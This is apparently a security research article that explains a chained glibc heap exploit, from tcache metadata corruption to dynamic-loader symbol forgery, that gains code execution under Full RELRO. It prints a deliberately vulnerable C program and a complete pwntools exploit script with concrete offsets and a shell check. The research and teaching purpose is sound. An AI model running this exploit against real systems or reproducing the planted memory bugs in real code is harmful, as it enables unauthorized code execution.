![undefined](https://lowlevel.re/uploads/1769708079156.png)

## Abstract

Modern heap hardening mechanisms — including **tcache**, allocator-level **size restrictions**, and **Full RELRO** — are commonly assumed to drastically reduce the exploitability of heap-based vulnerabilities, particularly in the absence of memory disclosure primitives.

This paper demonstrates that this assumption is **incomplete**.

We present a detailed, end-to-end exploitation chain that derives a **precise, byte-wise relative write primitive** from a constrained heap vulnerability, bypasses allocator-enforced size limits, **corrupts tcache metadata itself**, and escalates into **dynamic loader metadata corruption**, resulting in **arbitrary code execution under Full RELRO**, **without GOT**, **without PLT**, and **without absolute address disclosure**.

Rather than relying on a single vulnerability, this work focuses on the **composition of weak primitives across subsystems**: heap metadata corruption, tcache trust violations, pointer confusion, and loader metadata abuse.

---

## Scope & Assumptions

This exploit chain is demonstrated against a specific glibc and dynamic loader configuration.
Certain properties (relative DSO layout, writable loader mappings) are **empirical rather than ABI-guaranteed**.

The objective is not universal exploit reliability, but to show that **modern hardening does not eliminate cross-subsystem composition attacks** when implicit trust boundaries remain.

---

## 1. Threat Model

The attacker has:

- A **heap-based out-of-bounds write**
    - byte-granular
    - forward-only
    - relative to a valid allocation
- A **signed index confusion** allowing unintended `free()` targets
- **No arbitrary memory read**
- **No absolute address disclosure**
- Full modern mitigations enabled

The attacker cannot:

- leak libc or heap bases directly
- overwrite function pointers directly
- invoke PLT/GOT-based resolution

This threat model reflects realistic post-mitigation exploitation scenarios and explicitly forbids classic shortcuts.

---

## 2. High-Level Invariant

> **Invariant:** If attacker-controlled data is interpreted as trusted allocator or loader metadata, control-flow integrity is lost.

This invariant recurs across subsystems:

- Heap chunk metadata (`size` field)
- Tcache freelist management
- Dynamic loader metadata (`DT_SYMTAB`, `Elf64_Sym`)

The exploit demonstrates how violating allocator invariants enables violating loader invariants, even though these subsystems are typically reasoned about independently.

---

## 3. Exploitation Overview

```
heap OOB write
   ↓
forged chunk sizes
   ↓
tcache saturation
   ↓
unsorted bin transition
   ↓
arena overlap
   ↓
libc-relative write
   ↓
loader metadata corruption
   ↓
ELF symbol forgery
   ↓
RIP control
```

---

## 4. Vulnerable Program (Full Source)

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define MAX 8
#define MAX_SZ 0x90

void *heapbase;
char *table[MAX];

void getheap(void){
    void *a = malloc(0x500);
    free(a);
    heapbase = (void *)((char *)a - 0x290);
}

void create(void) {
    int idx, size;
    scanf("%d", &idx);
    scanf("%d", &size);

    if (idx >= MAX || size <= 0 || size > MAX_SZ)
        return;

    getchar();

    table[idx] = malloc(size);
    fgets(table[idx], size, stdin);
}

void edit(void) {
    int idx;
    int off;
    unsigned char val;

    scanf("%d", &idx);
    if (idx >= MAX) return;

    scanf("%d", &off);
    scanf("%hhx", &val);
    table[idx][off] = val;
}

void destroy(void) {
    int idx;

    scanf("%d", &idx);
    if (idx >= MAX)
        return;

    free(table[idx]);
    table[idx] = NULL;
}

int main(void) {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    getheap();

    while (1) {
        int c;
        scanf("%d", &c);

        if (c == 1) create();
        if (c == 2) edit();
        if (c == 3) destroy();
        if (c == 4) _exit(0);
    }
}
```

---

## 5. Primitive #1 — Byte-wise Forward OOB Write

The `edit()` function allows a single-byte write at an arbitrary positive offset from a valid heap chunk.

Properties:

- Single-byte precision
- Relative addressing
- Forward-only reach
- No direct control-flow overwrite

On its own, this primitive is insufficient for exploitation.

---

## 6. Forging Heap Chunk Sizes

### Heap Layout

Eight chunks of size `0x30` are allocated contiguously, enabling forward corruption of adjacent chunk metadata.

### Size Encoding

Setting `size = 0x291` yields:

- usable size `0x290`
- valid alignment
- `prev_inuse = 1`

glibc does **not validate the provenance** of size fields during `free()`.

![fake-sizes](https://lowlevel.re/uploads/1769764729102.png)

---

## 7. Tcache Saturation and Semantic Pivot

Seven forged frees saturate `tcache[0x290]`.

Once saturated:

- further frees bypass tcache
- allocator transitions to unsorted bin handling
- allocation-time size restrictions become irrelevant

![tcache-full](https://lowlevel.re/uploads/1769764980711.png)

---

## 8. Primitive #2 — Signed Index Confusion

Negative indices passed to `destroy()` allow freeing unintended pointers derived from heap memory.

glibc accepts these pointers as valid chunks, modeling common real-world sign and bounds errors.

---

## 9. Freeing Tcache Metadata Itself

With tcache saturated, freeing overlapping pointers causes **tcache metadata itself** to be interpreted as an unsorted bin chunk.

> Allocator bookkeeping data becomes attacker-controlled heap data.

![unsorted-tcache](https://lowlevel.re/uploads/1769764737682.png)

---

## 10. Deriving a libc-Relative Write Primitive

Subsequent allocations return memory backed by libc arena structures.

Combined with the original OOB write, this yields a **precise, byte-wise, forward relative write anchored in libc**.

![libc-in-heap](https://lowlevel.re/uploads/1769764735179.png)

---

## 11. Transition to Loader Metadata

From the libc anchor, writable loader mappings are reached via relative offsets.

Targets include:

- `DT_SYMTAB` pointers inside `struct link_map`
- concrete `Elf64_Sym` entries of already-loaded DSOs

This transition leverages runtime loader resolution semantics, discussed in more detail in [ret2dso](https://lowlevel.re/article/ret2dso-runtime-ret2dlresolve-under-full-relro).

---

## 12. ELF Symbol Forgery

During runtime resolution:

```
resolved = sym->st_value + l_addr
```

Only `st_value` influences control flow.
All other fields may be reused from a legitimate symbol entry.

---

## 13. Runtime Resolution Trigger

A single-byte corruption in the `stdin` `FILE` structure redirects execution into a libc code path performing runtime symbol resolution.

This yields direct control of RIP under Full RELRO.

---

## 14. Address Discovery Strategy

Relative drift between libc and ld.so is **empirical, not guaranteed**, but sufficiently constrained in practice to permit retry-based exploitation.

---

## 15. Full Exploit

```python
from pwn import *

context.binary = elf = ELF("heap-to-loader")

found = False
attempt = 1
while not found:
    try:
        log.info(f"Attempt: {attempt}")
        io = process("heap-to-loader")

        # --- Heap interaction primitives ---

        def heap_alloc(slot, size, data=b"A"):
            io.sendline(b"1")
            io.sendline(str(slot).encode())
            io.sendline(str(size).encode())
            io.sendline(data)

        def heap_byte_write(slot, offset, byte_hex):
            io.sendline(b"2")
            io.sendline(str(slot).encode())
            io.sendline(str(offset).encode())
            io.sendline(byte_hex)

        def heap_free(slot):
            io.sendline(b"3")
            io.sendline(str(slot).encode())

        # --- Derived arbitrary relative write ---
        def libc_relative_write(anchor_slot, relative_offset, payload: bytes):
            for i, b in enumerate(payload):
                heap_byte_write(
                    anchor_slot,
                    relative_offset + i,
                    f"{b:02x}".encode()
                )

        # === Phase 1: Heap grooming & tcache saturation ===
        for i in range(8):
            heap_alloc(i, 0x30)

        # Forge size fields to 0x291 using forward OOB writes
        for i in range(7):
            heap_byte_write(0, (i * 0x40) + 0x38, b"91")
            heap_byte_write(0, (i * 0x40) + 0x39, b"02")

        # Fill tcache[0x290]
        for i in range(8):
            heap_free(i)

        # === Phase 2: Free overlapping allocator metadata ===
        heap_free(-4)

        # Force unsorted bin allocation
        heap_alloc(0, 0x80, p16(1) * 4)

        # Allocation backed by libc arena
        heap_alloc(1, 0x30)

        # === Phase 3: Loader metadata corruption (ret2dso) ===

        ARENA_TO_STDIN_OFFSET     = -0x240
        STDIN_VTABLE_OFFSET       = 0xd8
        LINKMAP_SYMTAB_OFFSET    = 0xb60
        DSO_SYMBOL_OFFSET        = 0x208
        LD_WRITABLE_BASE_OFFSET  = 0x3a000

        ONE_GADGET_OFFSET        = 0x12ee1a
        LD_LIBC_DRIFT            = 0x1a8560

        forged_st_value = (
            -(LD_LIBC_DRIFT + ONE_GADGET_OFFSET)
            & 0xffffffffffffffff
        )

        forged_symbol = (
            p64(0x19) +                     # st_name (copied)
            p64(0xd001200000020) +          # metadata fields
            p64(forged_st_value)            # forged st_value
        )

        # Overwrite DT_SYMTAB pointer
        target = (
            ARENA_TO_STDIN_OFFSET
            + LD_LIBC_DRIFT
            + LD_WRITABLE_BASE_OFFSET
            + LINKMAP_SYMTAB_OFFSET
        )
        libc_relative_write(1, target, b"\xf0")

        # Overwrite concrete Elf64_Sym entry
        target = (
            ARENA_TO_STDIN_OFFSET
            + LD_LIBC_DRIFT
            + LD_WRITABLE_BASE_OFFSET
            + DSO_SYMBOL_OFFSET
        )
        libc_relative_write(1, target, forged_symbol)

        # Trigger runtime resolution via FILE corruption
        target = ARENA_TO_STDIN_OFFSET + STDIN_VTABLE_OFFSET + 7
        libc_relative_write(1, target, b"\xff")

        io.sendline(b"id")
        if b"uid" in io.clean():
            found = True
            io.interactive()

    except Exception:
        io.close()
        attempt += 1
```

![final](https://lowlevel.re/uploads/1769764740945.png)

---

## 16. Conclusion

Modern mitigations increasingly harden individual subsystems, but exploitation remains possible where **trust assumptions cross subsystem boundaries**.

As long as allocator, libc, and loader metadata remain mutually trusted, **weak primitives can still be composed into full control-flow compromise**, even under Full RELRO and without memory disclosure.

Web article at: https://lowlevel.re/article/composing-weak-heap-primitives